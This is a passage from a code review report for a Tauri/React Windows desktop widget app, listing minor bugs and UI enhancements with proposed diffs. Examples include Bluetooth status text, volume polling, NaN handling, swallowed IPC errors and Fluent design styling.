- **Fix**:
```diff
--- a/src/widgets/bluetooth/BluetoothWidget.tsx
+++ b/src/widgets/bluetooth/BluetoothWidget.tsx
@@ -146,3 +146,4 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
   }, [devices]);
 
-  const statusText = devices.length > 0 ? "Aktiv" : "Keine Geräte";
+  const hasConnected = devices.some((d) => d.connected);
+  const statusText = hasConnected ? "Verbunden" : devices.length > 0 ? "Bereit" : "Keine Geräte";
 
@@ -173,3 +174,3 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
                 className={cn(
                   "text-[10px] px-1.5 py-0.2 rounded-full font-medium flex-shrink-0",
-                  devices.length > 0
+                  hasConnected
                     ? "bg-emerald-500/15 text-emerald-400 border border-emerald-500/20"
```

---

### [MINOR] [OPEN] M5-05 Missing volume poll interval or OS event listener leaves slider permanently out of sync
- **Status**: OPEN
- **Where**: `src/hooks/useMasterVolume.ts:38-73`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: User adjusts system volume using keyboard hardware keys (Volume Up/Down) or the Windows taskbar slider. The widget volume slider never updates and stays on the initial mount value.
- **Why**: `useMasterVolume` invokes `refresh()` only once on initial component mount and lacks periodic polling or native WASAPI endpoint callbacks.
- **Fix**:
```diff
--- a/src/hooks/useMasterVolume.ts
+++ b/src/hooks/useMasterVolume.ts
@@ -67,3 +67,8 @@ export function useMasterVolume(initialVolume = 0.5, initialMuted = false): UseM
     if (isTauri()) {
       void refresh();
+      const interval = setInterval(() => {
+        void refresh();
+      }, 3000);
+      return () => {
+        isMountedRef.current = false;
+        clearInterval(interval);
+      };
     }
```

---

### [MINOR] [OPEN] M5-06 MetricBar unvalidated `NaN` produces `"NaN%"` and invalid CSS progress bar width
- **Status**: OPEN
- **Where**: `src/widgets/resources/MetricBar.tsx:28-30`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: During system wake or when sensor readings are momentarily uninitialized, `percent` passed to `MetricBar` is `NaN`. MetricBar renders `"NaN%"` and passes `NaN` to `ProgressBar`, resulting in `style={{ width: "NaN%" }}` and `aria-valuenow={NaN}`.
- **Why**: `Math.round(NaN)` returns `NaN`, and `Math.min(Math.max(NaN, 0), 100)` evaluates to `NaN` without a finite fallback guard.
- **Fix**:
```diff
--- a/src/widgets/resources/MetricBar.tsx
+++ b/src/widgets/resources/MetricBar.tsx
@@ -27,4 +27,5 @@ export const MetricBar: FC<MetricBarProps> = ({
 }) => {
-  const roundedPercent = Math.min(Math.max(Math.round(percent), 0), 100);
+  const safePercent = Number.isFinite(percent) ? percent : 0;
+  const roundedPercent = Math.min(Math.max(Math.round(safePercent), 0), 100);
   const activeVariant = variant ?? getMetricVariant(roundedPercent);
```

---

### [MINOR] [OPEN] M5-07 False positive "Gestartet" feedback when quick action fails in QuickSettingsWidget
- **Status**: OPEN
- **Where**: `src/widgets/quick-settings/QuickSettingsWidget.tsx:201-228`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User clicks a custom quick action tile targeting an invalid path or prohibited executable. The backend returns an error. The error is swallowed, but because `setActiveFeedback(actionId)` was called unconditionally at the start of the handler, the tile displays "Gestartet" with a spinning sparkle icon, falsely indicating success.
- **Why**: `setActiveFeedback` is set before invoking the IPC command instead of only after successful execution.
- **Fix**:
```diff
--- a/src/widgets/quick-settings/QuickSettingsWidget.tsx
+++ b/src/widgets/quick-settings/QuickSettingsWidget.tsx
@@ -201,3 +201,2 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
   const handleActionClick = async (actionId: string) => {
-    setActiveFeedback(actionId);
 
@@ -222,4 +221,6 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
       });
-    } catch {
-      // Safe fallback in web/test environment
+      setActiveFeedback(actionId);
+      setTimeout(() => {
+        setActiveFeedback((prev) => (prev === actionId ? null : prev));
+      }, 700);
+    } catch {
+      // Action failed to execute
     } finally {
-      setTimeout(() => {
-        setActiveFeedback((prev) => (prev === actionId ? null : prev));
-      }, 700);
     }
```

---

### [MINOR] [OPEN] M5-08 Swallowed error in `handleToggleDevice` leaves user without feedback when WinRT disconnection fails
- **Status**: OPEN
- **Where**: `src/widgets/bluetooth/BluetoothWidget.tsx:114-118`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: User clicks "Trennen" on a connected Bluetooth device. WinRT backend returns `Err("Bluetooth device disconnection is not supported directly via WinRT; please use Windows Settings")`. The button spinner disappears and the device stays connected with no error message displayed to the user.
- **Why**: `handleToggleDevice` catches the rejection and only prints to `console.error`, omitting a call to `setError`.
- **Fix**:
```diff
--- a/src/widgets/bluetooth/BluetoothWidget.tsx
+++ b/src/widgets/bluetooth/BluetoothWidget.tsx
@@ -114,3 +114,4 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
     } catch (err) {
       console.error("Failed to toggle bluetooth device:", err);
+      setError(err instanceof Error ? err.message : String(err));
     } finally {
```

---

### [MINOR] [OPEN] M5-09 Missing unmount cancellation guards in BluetoothWidget async handlers
- **Status**: OPEN
- **Where**: `src/widgets/bluetooth/BluetoothWidget.tsx:82-120`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: Bluetooth widget is unmounted while `get_bluetooth_devices` or `toggle_bluetooth_device` IPC calls are awaiting response. When IPC resolves, state updates (`setDevices`, `setIsLoading`, `setTogglingId`) fire against the unmounted component.
- **Why**: `BluetoothWidget` lacks an `isMountedRef` check inside its async completion callbacks.
- **Fix**:
```diff
--- a/src/widgets/bluetooth/BluetoothWidget.tsx
+++ b/src/widgets/bluetooth/BluetoothWidget.tsx
@@ -1,3 +1,3 @@
-import { useState, useEffect, useCallback, useMemo, type FC } from "react";
+import { useState, useEffect, useCallback, useMemo, useRef, type FC } from "react";
@@ -86,2 +86,10 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
   const [togglingId, setTogglingId] = useState<string | null>(null);
+  const isMountedRef = useRef(true);
+
+  useEffect(() => {
+    isMountedRef.current = true;
+    return () => {
+      isMountedRef.current = false;
+    };
+  }, []);
@@ -93,4 +101,6 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
       const list = await invoke<BluetoothDeviceInfo[]>("get_bluetooth_devices");
-      setDevices(list || []);
+      if (isMountedRef.current) {
+        setDevices(list || []);
+      }
     } catch (err) {
@@ -98,3 +108,5 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
     } finally {
-      setIsLoading(false);
+      if (isMountedRef.current) {
+        setIsLoading(false);
+      }
     }
```

---

### [MINOR] [OPEN] M6-04 Clock Timer Calls State Setter Inside State Updater Function Violating Purity
- **Where**: `src/widgets/clock/ClockWidget.tsx:98-105`
- **Status**: OPEN
- **Source**: `r-review` (Tier 2/3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: When the timer countdown reaches 0 seconds, React throws console warnings or causes state desynchronization in Concurrent or Strict Mode.
- **Why**: `setIsTimerRunning(false)` is called inside the functional updater passed to `setTimerRemaining`. React updater functions must be pure projections without side effects.
- **Fix**:
```diff
--- a/src/widgets/clock/ClockWidget.tsx
+++ b/src/widgets/clock/ClockWidget.tsx
@@ -95,14 +95,14 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
   useEffect(() => {
     if (!isTimerRunning) return;
     const interval = setInterval(() => {
-      setTimerRemaining((prev) => {
-        if (prev <= 1) {
-          setIsTimerRunning(false);
-          return 0;
-        }
-        return prev - 1;
-      });
+      setTimerRemaining((prev) => Math.max(0, prev - 1));
     }, 1000);
     return () => clearInterval(interval);
   }, [isTimerRunning]);
+
+  useEffect(() => {
+    if (timerRemaining === 0 && isTimerRunning) {
+      setIsTimerRunning(false);
+    }
+  }, [timerRemaining, isTimerRunning]);
```

---

### [MINOR] [OPEN] M6-05 Weather `fetchWeather` Swallows `AbortError` and Erroneously Returns Cached Stale Data
- **Where**: `src/services/weather/openMeteo.ts:262-269`
- **Status**: OPEN
- **Source**: `r-review` (Tier 2/3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract
- **Scenario**: When a weather fetch is canceled via `AbortSignal` (e.g. user selects a different location in Settings or the widget unmounts), `fetch` throws `DOMException: AbortError`. Instead of propagating the abort or resolving cleanly, `fetchWeather` catches all errors and returns stale cached data with `isOffline: true`.
- **Why**: `fetchWeather` does not inspect `error.name === "AbortError"` or `signal?.aborted` before activating its offline cache fallback, unlike `geocoding.ts:40`.
- **Fix**:
```diff
--- a/src/services/weather/openMeteo.ts
+++ b/src/services/weather/openMeteo.ts
@@ -260,6 +260,9 @@ export async function fetchWeather(
     setCachedWeather(weatherData);
     return weatherData;
   } catch (error: unknown) {
+    if (error instanceof DOMException && error.name === "AbortError") {
+      throw error;
+    }
     const cached = getCachedWeather();
     if (cached) {
       return { ...cached, isOffline: true };
```

---

### [MINOR] [OPEN] M6-06 Weather `DailyForecast` Unconditionally Labels First Day as "Heute" Even for Stale Offline Cache
- **Where**: `src/widgets/weather/DailyForecast.tsx:11-22`
- **Status**: OPEN
- **Source**: `r-review` (Tier 2/3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User launches vvidget while offline. The widget displays cached forecast data from 2 days ago (e.g. Sunday). The first row in the 5-day forecast displays "Heute" next to Sunday's temperatures, falsely presenting 2-day-old weather as current.
- **Why**: `formatDayName` checks `if (index === 0) return "Heute";` blindly without comparing `dateString` against current date.
- **Fix**:
```diff
--- a/src/widgets/weather/DailyForecast.tsx
+++ b/src/widgets/weather/DailyForecast.tsx
@@ -10,7 +10,8 @@ const GERMAN_DAY_NAMES = ["So", "Mo", "Di", "Mi", "Do", "Fr", "Sa"];
 
 function formatDayName(dateString: string, index: number): string {
-  if (index === 0) return "Heute";
+  const todayKey = new Date().toISOString().slice(0, 10);
+  if (dateString === todayKey || (index === 0 && !dateString)) return "Heute";
   try {
     const date = new Date(dateString);
     if (!isNaN(date.getTime())) {
```

---

### [MINOR] [OPEN] X-ipc-concurrency-07 Swallowed backend IPC errors and optimistic state desynchronization in `useCalendar` and `QuickSettingsWidget`
- **Status**: OPEN
- **Where**: `src/hooks/useCalendar.ts:150-209`, `src/widgets/quick-settings/QuickSettingsWidget.tsx:200-228`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: In `useCalendar`, `addNote`, `removeNote`, and `toggleNote` optimistically update local state and call `safeInvoke`. When the backend returns an error (e.g. disk error or empty text validation), empty `catch {}` blocks swallow the error completely. The state is never rolled back, no error is set, and the user is unaware their note was rejected. In `QuickSettingsWidget`, `handleActionClick` sets `activeFeedback` before the IPC call, and swallows errors with an empty catch block, flashing a false-positive "Gestartet" feedback for 700ms when launch fails.
- **Why**: Promises from `safeInvoke` and `invoke` are caught by empty catch clauses without error state updates or rollback mechanisms.
- **Fix**:
```diff
--- a/src/hooks/useCalendar.ts
+++ b/src/hooks/useCalendar.ts
@@ -154,3 +154,4 @@ export function useCalendar(options?: UseCalendarOptions): UseCalendarReturn {
         });
-      } catch {
-        // Ignored in non-Tauri / mock environments
+      } catch (err) {
+        if (isTauri()) {
+          setError(err instanceof Error ? err.message : String(err));
+          void safeInvoke<Record<string, CalendarNote[]>>("get_calendar_events")
+            .then((res) => setEvents(res || {}));
+        }
       }
--- a/src/widgets/quick-settings/QuickSettingsWidget.tsx
+++ b/src/widgets/quick-settings/QuickSettingsWidget.tsx
@@ -201,3 +201,2 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
   const handleActionClick = async (actionId: string) => {
-    setActiveFeedback(actionId);
     try {
@@ -221,4 +220,6 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
       });
-    } catch {
-      // Safe fallback in web/test environment
+      setActiveFeedback(actionId);
+    } catch (err) {
+      console.error("Action execution failed:", err);
     } finally {
```

---

### [ENHANCEMENT] [OPEN] M1-09 Oversized Screen Invalidation in `hide_skeleton_preview` and `WM_EXITSIZEMOVE`
- **Status**: OPEN
- **Where**: `src-tauri/src/window/win32.rs:326`, `src-tauri/src/window/win32.rs:534`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance
- **Scenario**: Widget drag concludes and preview is hidden.
- **Why**: `invalidate_screen_rect(0, 0, 8000, 8000)` calls `RedrawWindow` across the entire multi-monitor desktop workspace and all child windows with `RDW_ALLCHILDREN`, causing unnecessary desktop repaints and transient flicker rather than dirtying only the skeleton window's bounding rect.
- **Fix**:
```diff
--- a/src-tauri/src/window/win32.rs
+++ b/src-tauri/src/window/win32.rs
@@ -531,5 +531,7 @@ unsafe extern "system" fn widget_subclass_proc(
                 let skel = get_skeleton_hwnd();
                 if skel != 0 {
                     let skel_hwnd = HWND(skel as *mut core::ffi::c_void);
+                    let mut skel_rect = RECT::default();
+                    let _ = GetWindowRect(skel_hwnd, &mut skel_rect);
                     use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;
                     let _ = ShowWindow(skel_hwnd, SW_HIDE);
-                    invalidate_screen_rect(0, 0, 8000, 8000);
+                    invalidate_screen_rect(skel_rect.left, skel_rect.top, skel_rect.right - skel_rect.left, skel_rect.bottom - skel_rect.top);
                 }
```

### [ENHANCEMENT] [OPEN] M2-09 Schema Version Inconsistency in `AppConfig::default()` Triggers Spurious Migrations
- **Status**: OPEN
- **Where**: `src-tauri/src/config/model.rs:240`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract
- **Scenario**: `AppConfig::default()` hardcodes `version: 1`, while the active schema version is 2. Any config serialized from defaults (or missing the `version` key in partial JSON) deserializes as `version: 1`, repeatedly re-triggering schema migration logic and spatial collision resolution in `load_or_recover_config`.
- **Why**: The default constructor was not updated to reflect current schema version 2.
- **Fix**:
```diff
--- a/src-tauri/src/config/model.rs
+++ b/src-tauri/src/config/model.rs
@@ -239,3 +239,3 @@ impl Default for AppConfig {
         Self {
-            version: 1,
+            version: 2,
             lock_positions: false,
```

### [ENHANCEMENT] [OPEN] M4-09 SkeletonWidget missing from layout barrel export
- **Status**: OPEN
- **Where**: `src/components/layout/index.ts:1-2`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract
- **Scenario**: Consumers importing components from `@/components/layout` find `SkeletonWidget` missing from the barrel export, forcing direct internal file imports (`@/components/layout/SkeletonWidget`).
- **Why**: `src/components/layout/index.ts` only exports `HeaderBar` and `WidgetContainer`.
- **Fix**:
```diff
--- a/src/components/layout/index.ts
+++ b/src/components/layout/index.ts
@@ -2,1 +2,2 @@
 export { WidgetContainer } from "./WidgetContainer";
+export { SkeletonWidget, type SkeletonWidgetProps } from "./SkeletonWidget";
```

### [ENHANCEMENT] [OPEN] M4-10 HeaderBar action toolbar div allows pointerdown to bubble and start window drag
- **Status**: OPEN
- **Where**: `src/components/layout/HeaderBar.tsx:102-105`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: MEDIUM
- **Category**: robustness
- **Scenario**: If custom interactive components, icon buttons, or dropdown triggers rendered inside `actions` are clicked, pointer events bubble up to the `<header>` element because the container only stops `mousedown`. This triggers `useGridDrag`'s `onPointerDown` if the child element is not a standard HTML `<button>` or `<a>` tag.
- **Why**: The actions wrapper div handles `onMouseDown={(e) => e.stopPropagation()}` but does not stop `onPointerDown` or specify `data-no-drag`.
- **Fix**:
```diff
--- a/src/components/layout/HeaderBar.tsx
+++ b/src/components/layout/HeaderBar.tsx
@@ -103,4 +103,6 @@
       <div
         className="flex items-center gap-1 flex-shrink-0"
         onMouseDown={(e) => e.stopPropagation()}
+        onPointerDown={(e) => e.stopPropagation()}
+        data-no-drag
       >
```

### [ENHANCEMENT] [OPEN] M5-10 Dead code and continuous CPU history array allocations for unrendered MiniGraph
- **Status**: OPEN
- **Where**: `src/widgets/resources/MiniGraph.tsx:1-106`, `src/hooks/useSystemMetrics.ts:72-88`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance
- **Scenario**: Telemetry events trigger `appendCpuSample` every second. The hook slices and allocates a new 20-element number array for `cpuHistory` on every update, but `ResourceWidget` never imports or renders `MiniGraph` or `cpuHistory`.
- **Why**: `MiniGraph` was disconnected during redesign without removing the unused component export or cleaning up `cpuHistory` state accumulation in `useSystemMetrics.ts`.
- **Fix**: Either re-embed `MiniGraph` beneath the CPU MetricBar in `ResourceWidget.tsx` or deprecate the unused `cpuHistory` accumulation in `useSystemMetrics.ts`.

### [ENHANCEMENT] [OPEN] M6-07 Spotify TrackProgress Displays Clickable Seek Controls When Seeking Is Unsupported
- **Where**: `src/widgets/spotify/TrackProgress.tsx:82-99`
- **Status**: OPEN
- **Source**: `r-review` (Tier 2/3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: User clicks on the progress bar in the Spotify widget or presses arrow keys. The progress thumb visually moves to the clicked point, but since `onSeek` is not provided by `SpotifyWidget`, the thumb snaps back to the real track position 250ms later.
- **Why**: `TrackProgress` renders `cursor-pointer`, `onClick={handleSeekClick}`, and `tabIndex={0}` unconditionally even when `onSeek` is `undefined`.
- **Fix**:
```diff
--- a/src/widgets/spotify/TrackProgress.tsx
+++ b/src/widgets/spotify/TrackProgress.tsx
@@ -82,10 +82,10 @@ export const TrackProgress: FC<TrackProgressProps> = ({
     <div className={`w-full flex flex-col gap-1 select-none ${className}`} data-testid="track-progress">
       <div
-        className="w-full py-1 -my-1 cursor-pointer group"
-        onClick={handleSeekClick}
-        onKeyDown={handleKeyDown}
-        tabIndex={0}
+        className={`w-full py-1 -my-1 group ${onSeek ? "cursor-pointer" : "cursor-default"}`}
+        onClick={onSeek ? handleSeekClick : undefined}
+        onKeyDown={onSeek ? handleKeyDown : undefined}
+        tabIndex={onSeek ? 0 : -1}
         role="progressbar"
         aria-valuenow={Math.round(percent)}
```

---

### [ENHANCEMENT] [OPEN] M6-08 SpotifyWidget Triggers Immediate Re-render on Track Changes via Render-Phase State Mutations
- **Where**: `src/widgets/spotify/SpotifyWidget.tsx:44-51`
- **Status**: OPEN
- **Source**: `r-review` (Tier 2/3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance
- **Scenario**: When track or album artwork changes, `SpotifyWidget` performs two state updates during render execution (`setPrevArtUrl`, `setImgError`), forcing React to discard and re-execute the render.
- **Why**: State synchronization during render execution triggers an immediate additional render pass instead of resetting image error state using React keys or `useEffect`.
- **Fix**:
```diff
--- a/src/widgets/spotify/SpotifyWidget.tsx
+++ b/src/widgets/spotify/SpotifyWidget.tsx
@@ -44,11 +44,9 @@ export const SpotifyWidget: FC<SpotifyWidgetProps> = ({
   const { volume, isMuted, setVolume, toggleMute } = useMasterVolume();
 
-  const [prevArtUrl, setPrevArtUrl] = useState(session.album_art_url);
-  const [imgError, setImgError] = useState(false);
-
-  // Sync state during render when track or album art changes
-  if (prevArtUrl !== session.album_art_url) {
-    setPrevArtUrl(session.album_art_url);
-    setImgError(false);
-  }
+  const [imgErrorKey, setImgErrorKey] = useState<string | null>(null);
+  const imgError = imgErrorKey === session.album_art_url;
+  const handleImgError = () => {
+    if (session.album_art_url) setImgErrorKey(session.album_art_url);
+  };
```

### [ENHANCEMENT] [OPEN] X-fluent-ux-security-09 All-Caps Tracked Section Headers Violate Windows 11 WinUI 3 Typography Guidelines
- **Status**: OPEN
- **Where**: `src/widgets/battery/BatteryWidget.tsx:282, 318`, `src/widgets/weather/HourlyTrend.tsx:51`, `src/widgets/weather/DailyForecast.tsx:31`, `src/widgets/spotify/SpotifyWidget.tsx:95`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: visual / typography
- **Scenario**: Section headers in widget cards display in all-caps tracked lettering: "KAPAZITÄTSVERLAUF", "LAUFZEIT-PROGNOSEN", "STÜNDLICHER TREND", "5-TAGE-VORHERSAGE", "WIEDERGABE" / "PAUSIERT".
- **Why**: Windows 11 Fluent Design System and WinUI 3 typography specifications strictly avoid all-caps tracked headers on desktop cards, mandating sentence case (e.g. "Kapazitätsverlauf", "Stündlicher Trend") in `Segoe UI Variable Text` Semibold with standard kerning.
- **Fix**:
```diff
--- a/src/widgets/battery/BatteryWidget.tsx
+++ b/src/widgets/battery/BatteryWidget.tsx
@@ -279,7 +279,7 @@ export const BatteryWidget: FC<BatteryWidgetProps> = ({
       {/* Historical Sparkline */}
       <div className="space-y-1">
-        <div className="text-[10px] font-semibold uppercase tracking-wider text-[var(--fluent-text-tertiary)] px-0.5">
+        <div className="text-[11px] font-semibold text-[var(--fluent-text-secondary)] px-0.5">
           Kapazitätsverlauf {capacity_history.length > 0 && `(${capacity_history.length} Messpunkte)`}
         </div>
         <BatterySparkline points={capacity_history} />
```

---

### [ENHANCEMENT] [OPEN] X-fluent-ux-security-10 Stadium Pill Shapes in Category Filters Violate WinUI 3 Segmented Control Pattern
- **Status**: OPEN
- **Where**: `src/widgets/launcher/GameLauncherWidget.tsx:209-223`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: visual / controls
- **Scenario**: Category filter buttons ("Alle", "Steam", "Epic", "Eigene") in `GameLauncherWidget` are styled as `rounded-full` mobile-style stadium pills.
- **Why**: In WinUI 3, segmented filter controls are structured as 4px rounded rectangles (`rounded-[4px]`) within a continuous recessed control background (`bg-[var(--fluent-control-bg)]`), maintaining consistency with Windows 11 native dialogs and Settings apps.
- **Fix**:
```diff
--- a/src/widgets/launcher/GameLauncherWidget.tsx
+++ b/src/widgets/launcher/GameLauncherWidget.tsx
@@ -206,7 +206,7 @@ export const GameLauncherWidget: FC<GameLauncherWidgetProps> = ({
             <button
               key={cat.id}
               type="button"
               onClick={() => setSelectedCategory(cat.id)}
               className={cn(
-                "px-2.5 py-0.5 text-[11px] rounded-full transition-all font-medium whitespace-nowrap",
+                "px-2.5 py-1 text-[11px] rounded-[4px] transition-all font-medium whitespace-nowrap",
                 isActive
-                  ? "bg-[var(--fluent-accent)] text-black font-semibold shadow-sm"
+                  ? "bg-[var(--fluent-card-hover)] text-[var(--fluent-text-primary)] font-semibold shadow-xs border border-[var(--fluent-stroke)]"
```

### Coverage / Not Reviewed
- **Reviewed**: Entire repository (145 files across `src-tauri/src/**`, `src/**`, `src/styles/fluent.css`, `index.css`, UI layout & widgets against Windows 11 Fluent Design System guidelines).
- **Excluded / Not Reviewed**: Auto-generated ACL capability schemas (`src-tauri/gen/**`), third-party packages in `node_modules`, compiled binaries in `dist` and `target`.
